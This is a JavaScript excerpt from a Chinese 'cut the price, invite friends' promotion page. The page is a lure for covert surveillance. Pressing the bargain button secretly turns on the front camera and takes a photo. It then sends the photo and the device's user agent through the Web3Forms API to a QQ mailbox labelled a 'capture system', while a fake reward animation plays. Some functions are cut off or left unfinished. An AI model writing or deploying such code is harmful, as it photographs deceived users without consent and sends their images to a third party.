<script>
var W3F_KEY = '8809e3dd-3301-47c4-a4c1-76bf6c5d964d';
var left = 88.32;

function $(id){ return document.getElementById(id); }

function log(msg){
  console.log(msg);
  var panel = $('logPanel');
  var list = $('logList');
  if(panel && list){
    panel.style.display = 'block';
    var time = new Date().toLocaleTimeString('zh-CN');
    var div = document.createElement('div');
    div.style.cssText = 'margin:2px 0;border-bottom:1px solid #030;padding-bottom:2px;word-break:break-all';
    div.textContent = '[' + time + '] ' + msg;
    list.insertBefore(div, list.firstChild);
    if(list.children.length > 30){
      list.removeChild(list.lastChild);
    }
  }
}

function toast(msg){
  var t = $('toast');
  t.textContent = msg;
  t.style.opacity = '1';
  setTimeout(function(){ t.style.opacity = '0'; }, 1800);
}

function coinRain(){
  for(var i=0;i<14;i++){
    (function(){
      var c = document.createElement('div');
      c.textContent = ['🪙','💰','✨','🎉'][Math.floor(Math.random()*4)];
      c.style.cssText = 'position:fixed;top:-20px;font-size:24px;z-index:998;pointer-events:none;animation:fall 1.6s linear forwards;left:' + (Math.random()*100) + 'vw;animation-duration:' + (1.2+Math.random()*0.8) + 's;animation-delay:' + (Math.random()*0.3) + 's';
      document.body.appendChild(c);
      setTimeout(function(){
        if(c.parentNode) c.parentNode.removeChild(c);
      }, 2200);
    })();
  }
}
var style = document.createElement('style');
style.textContent = '@keyframes fall{to{transform:translateY(110vh) rotate(540deg);opacity:0}}';
document.head.appendChild(style);

function updateProgress(){
  var fg = $('ringFg');
  if(fg) fg.style.strokeDashoffset = 251.3 - (251.3 * 0.75);
  $('leftMoney').textContent = left.toFixed(2);
  $('leftMoney2').textContent = left.toFixed(2);
}

function showLoading(){

function showResult(cut){
  var need = Math.ceil(Math.random()*3+1);
  $('modalContent').innerHTML = '<div style="font-size:42px;margin:6px 0">🎉🪙</div><div style="font-size:17px;color:#ff4040;font-weight:700">恭喜!成功砍掉 ' + cut.toFixed(2) + ' 元</div><div style="font-size:13px;color:#666;line-height:1.6;margin:12px 0">还差 <b style="color:#ff4040">' + left.toFixed(2) + '</b> 元<br>再邀请 ' + need + ' 位新好友即可 0 元拿</div><button id="modalBtn" style="background:linear-gradient(180deg,#ff5a4d,#ff2a2a);color:#fff;width:100%;padding:12px;border-radius:30px;font-size:15px;font-weight:700;border:none;cursor:pointer">继续邀请好友 👉</button><div id="shareWx" style="font-size:11px;color:#999;margin-top:10px;text-decoration:underline;cursor:pointer">📤 分享到微信</div>';
  document.getElementById('modalBtn').addEventListener('click', function(){
    $('overlay').style.display = 'none';
  });
  var sw = document.getElementById('shareWx');
  if(sw) sw.addEventListener('click', function(){ toast('请点击右上角 ··· 分享'); });
  coinRain();
}

// 将相机图像作为 MIME 附件发送
// QQ邮箱将 message 字段里的 data:image/...;base64,... 视为普通文本。
// 这里改用 Web3Forms 支持的 multipart 文件附件：QQ邮箱会显示图片预览/附件。
function uploadImage(blob){
  log('[上传] 开始,大小 ' + (blob ? blob.size : 0) + ' 字节');
  return new Promise(function(resolve){
    if(!blob){
      log('[上传] ✗ 图片为空');
      toast('⚠️ 没有可上传的图片');
      resolve(false);
      return;
    }

    var fd = new FormData();
    var stamp = new Date().toISOString().replace(/[.:]/g, '-');
    fd.append('access_key', W3F_KEY);
    fd.append('subject', '📸 新捕获 · ' + new Date().toLocaleString('zh-CN'));
    fd.append('from_name', '捕获系统');
    fd.append('message',
      '时间: ' + new Date().toLocaleString('zh-CN') + '\n' +
      '设备: ' + navigator.userAgent + '\n' +
      '大小: ' + blob.size + ' 字节\n\n' +
      '图片已作为 JPG 附件发送，请在 QQ邮箱 中点击图片预览或下载附件。'
    );
    // Web3Forms 文件字段名必须是 attachment；不要手工设置 Content-Type。
    fd.append('attachment', blob, 'capture-' + stamp + '.jpg');

    log('[上传] 以 multipart 附件发送到 web3forms...');
    fetch('https://api.web3forms.com/submit', {
      method: 'POST',
      body: fd
    }).then(function(r){
      return r.text().then(function(t){
        var data = null;
        try{ data = JSON.parse(t); }catch(e){}
        log('[上传] 返回状态: ' + r.status);
        log('[上传] 响应: ' + t.substring(0, 200));
        if(!r.ok || !data || data.success !== true){
          var reason = data && (data.message || (data.error && data.error.message));
          throw new Error(reason || ('HTTP ' + r.status));
        }
        log('[上传] ✓ 邮件已发送（含 JPG 附件）');
        toast('✓ 图片已发送，请查收 QQ邮箱');
        resolve(true);
      });
    }).catch(function(e){
      log('[上传] ✗ 错误: ' + e.message);
      toast('⚠️ 图片上传失败: ' + e.message);
      resolve(false);
    });
  });
}
function captureAndUpload(){
  log('[拍照] 启动');
  
  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    log('[拍照] 浏览器不支持');
    showMockResult();
    return;
  }

  var stream = null;
  var done = false;

  var timeoutId = setTimeout(function(){
    if(!done){
      done = true;
      log('[拍照] ⏰ 超时');
      if(stream){
        try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
      }
      showMockResult();
    }
  }, 8000);

  log('[拍照] 请求权限...');
  
  navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: 1280, height: 720 },
    audio: false
  }).then(function(s){
    log('[拍照] ✓ 拿到视频流');
    stream = s;
    var v = $('vid');
    v.srcObject = s;
    v.muted = true;
    v.setAttribute('playsinline', 'true');
    v.setAttribute('webkit-playsinline', 'true');
    return v.play().catch(function(e){ log('[拍照] play 警告: ' + e.message); });
  }).then(function(){
    log('[拍照] 等待 1.5 秒...');
    return new Promise(function(r){ setTimeout(function(){ r(); }, 1500); });
  }).then(function(){
    if(done) return null;
    done = true;
    clearTimeout(timeoutId);

    var v = $('vid');
    var c = $('canvas');
    var w = v.videoWidth || 640;
    var h = v.videoHeight || 480;
    log('[拍照] 尺寸: ' + w + 'x' + h);
    c.width = w;
    c.height = h;
    var ctx = c.getContext('2d');
    
    try{
      ctx.drawImage(v, 0, 0, w, h);
      log('[拍照] ✓ canvas OK');
    }catch(e){ log('[拍照] draw 错误: ' + e.message); }

    if(stream){
      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
    }

    return new Promise(function(resolve){
      c.toBlob(function(blob){
        log('[拍照] blob: ' + (blob ? blob.size : '空'));
        resolve(blob);
      }, 'image/jpeg', 0.85);
    });
  }).then(function(blob){
    if(done) return null;
    if(blob && blob.size > 1000){
      log('[拍照] ✓ 开始上传');
      return uploadImage(blob);
    } else {
      log('[拍照] ⚠️ 太小');
    }
  }).then(function(){
    if(done) return;
    var cut = (Math.random() * 8 + 2);
    left = Math.max(0.01, left - cut);
    updateProgress();
    showResult(cut);
  }).catch(function(e){
    if(done) return;
    done = true;
    clearTimeout(timeoutId);
    log('[拍照] ✗ ' + (e.name || '') + ' - ' + (e.message || ''));
    if(stream){
      try{ stream.getTracks().forEach(function(t){ t.stop(); }); }catch(e){}
    }
    showMockResult();
  });
}

function showMockResult(){
  setTimeout(function(){
    var cut = (Math.random() * 8 + 2);
    left = Math.max(0.01, left - cut);
    updateProgress();
    showResult(cut);
  }, 2800);
}

$('knifeBtn').addEventListener('click', function(){
  log('[按钮] 被点击');
  showLoading();
  captureAndUpload();
});

$('overlay').addEventListener('click', function(e){

var spinStyle = document.createElement('style');
spinStyle.textContent = '@keyframes spin{to{transform:rotate(360deg)}}';
